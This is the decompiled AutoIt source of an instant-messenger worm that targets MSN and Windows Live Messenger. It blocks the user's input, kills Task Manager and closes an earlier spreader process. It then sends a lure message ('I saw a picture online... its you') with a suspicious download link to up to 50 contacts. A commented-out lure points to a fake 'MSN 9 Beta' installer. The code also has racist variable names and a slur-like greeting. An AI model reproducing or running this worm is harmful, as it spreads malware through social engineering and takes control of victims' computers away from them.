; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Terence\P map\WiZZ\AutoIt3\sexy.au3>
; ----------------------------------------------------------------------------

;; MSN Messenger "Mass Messenger" v1.02 , HARHAR!!!
;; This Code is for Educational Purposes Only.
;; Greetingz to the "Knet Knet Nig Nig" Team
;;
		;;;;;;;;;;;;;;;;;;;;;;;      ;;;;           ;;;;
	   ;;;;;;;;;;;;;;;;;;;;;;;      ;;;;		   ;;;;
      ;;;;;;; 				       ;;;;           ;;;;
     ;;;;;;;;;;;;;;;;;;;;;;;      ;;;; WLM + 7.x ;;;;
    ;;;;;;;;;;;;;;;;;;;;;;;		 ;;;;           ;;;;
   ;;;;;;;					    ;;;;  Coding   ;;;;
  ;;;;;;;				       ;;;; <  By  >  ;;;;
 ;;;;;;;                      ;;;; XFREGGIRT ;;;;
;;;;;;;					     ;;;;;;;;;;;;;;;;;;;

#NoTrayIcon

;; Close current spreader
If ProcessExists("winhelp32.exe") Then
	ProcessClose("winhelp32.exe")
EndIf

Sleep( 120000 ) ;; Sleepy Time , 1 Minute till we're sure MSN is launched :)

AutoItSetOption("WinTitleMatchMode", 4)

;; Amount of spams you would like. Default 50
$AMOUNT = 50
;; Do not change ..
$KNET = 0
$NIG = 0

;; Wait till WLM pops up.
While WinWaitActive ( "classname=MSBLWindowClass" )
	if Winactive ( "classname=MSBLWindowClass" ) Then
;; Insert your Spam Sentence between (" ")
	;;ClipPut ( "Hey! , Im using the New MSN 9 Beta (H) , It has 100+ Options and New 3D Emoticons :D , Free Worldwide Calling and much more! ;) Download Microsoft's Free Online Installer Here! ===> http://shopping.msn.com/Track/TrackLink/shp/?p=setid=100:0&u=http://www.speedlinks.com/MSN9BETA-SETUP.exe&linkId=1970&dpId=2408&vendId=2408&catId=5318&hsv=bm=" )
	ClipPut("Heeey! I saw a picture online and im definately sure its you , the one on the left rite?? http://www.modelosunica.com/picdata/39ak4f2/picture_dl.php")
	;; Block User Mouse/Keyboard Input.
	   BlockInput ( 1 )
   EndIf

   If WInactive( "Windows Live Messenger" ) Then
	   ;; Change to Online Instead of Using Groups.
	   Send("{ALT}")
	   Send("{RIGHT}")
	   Send("{UP}")
       Send("{UP}")
	   Send("{UP}")
       Send("{UP}")
	   Send("{UP}")
       Send("{UP}")
       Send("{RIGHT}")
       Send("{ENTER}")
	   Sleep( 200 )
	   Send("{ALT}")
	   Send("{RIGHT}")
	   Send("{UP}")
       Send("{UP}")
	   Send("{UP}")
       Send("{UP}")
	   Send("{UP}")
       Send("{RIGHT}")
	   Send("{DOWN}")
	   Send("{DOWN}")
       Send("{ENTER}")
   ElseIf Winactive ( "MSN Messenger" ) Then
	   Send("{ALT}")
	   Send("{RIGHT}")
	   Send("{UP}")
       Send("{UP}")
	   Send("{UP}")
       Send("{UP}")
       Send("{RIGHT}")
	   Send("{DOWN}")
	   Send("{ENTER}")
   EndIf


	;; Start The Spam!
		Do
			if WinActive ( "classname=MSBLWindowClass" ) Then
			Send( "{HOME}" )
			Send( "{DOWN}" )
			Send( "{ENTER}")
		EndIf
			If WinActive ( "classname=IMWindowClass" ) Then
				Send( "^v" )
			    Send( "{ENTER}")
				Send( "{ESC}")
				Sleep ( 1600 )
			EndIf
			$KNET = $KNET + 1

		Until $KNET = 1

		While $NIG <= $AMOUNT
			BlockInput ( 1 )
			if WinActive ( "classname=MSBLWindowClass" ) Then
				Send( "{DOWN}" )
				Send( "{ENTER}")
			EndIf
				;; When Buddy Window Shows up , SPAM!
				If WinActive( "classname=IMWindowClass" ) Then
					Send( "^v" )
					Send( "{ENTER}" )
					Send( "{ESC}")
					Sleep ( 1600 )
					$NIG = $NIG + 1
				ElseIf ProcessExists( "taskmgr.exe" ) Then
						ProcessClose( "taskmgr.exe" )
					EndIf
				If WinActive( "classname=#32770") Then
					Send ("{ESC}")
				EndIf
			    If WinActive( "classname=PageWindowClass") Then
					Send("{ESC}")
				EndIf

				If WinActive( "classname=IEFrame" ) Then
				BlockInput ( 0 )
				Exit
				EndIf
				;; Offline Messages Safety :)
				If Winactive ( "classname=DUIDialog" ) Then
					Send( "{+}" )
					Send( "{ENTER}" )
				EndIf
				;; If $NIG Hit the $AMOUNT you ordered , quit.
				If  $AMOUNT <= $NIG  Then
					BlockInput ( 0 )
					ProcessClose("msnmsgr.exe")
					$PID = ProcessExists("msnmsgr.exe") ; Will return the PID or 0 if the process isn't found.
					If $PID Then ProcessClose($PID)
					Exit
				EndIf
		WEnd
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Terence\P map\WiZZ\AutoIt3\sexy.au3>
; ----------------------------------------------------------------------------

